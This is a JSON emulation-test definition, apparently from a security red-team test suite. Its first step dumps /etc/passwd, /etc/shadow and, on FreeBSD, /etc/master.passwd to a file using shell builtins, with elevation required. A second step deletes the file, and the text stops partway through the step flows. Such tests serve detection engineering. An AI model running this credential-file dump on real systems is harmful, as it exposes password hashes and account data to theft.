{
  "id": "f5aa6543-6cb2-4fae-b9c2-b96e14721713",
  "name": "Access /etc/{shadow,passwd,master.passwd} with shell builtins",
  "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "d6045485-8477-46dd-bfe1-e74732055089",
      "type": "execute-command",
      "data": {
        "command": "testcat(){ (while read line; do echo $line \u003e\u003e #{output_file}; done \u003c $1) }\n[ \"$(uname)\" = 'FreeBSD' ] \u0026\u0026 testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "8deb3cad-a3bb-43b6-8874-74c9f6ae2b58",
      "type": "execute-command",
      "data": {
        "command": "rm -f #{output_file}\n",
        "command_type": "sh"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "d6045485-8477-46dd-bfe1-e74732055089",
      "p": "on-success",
      "o": "8deb3cad-a3bb-43b6-8874-74c9f6ae2b58"
    },
    {
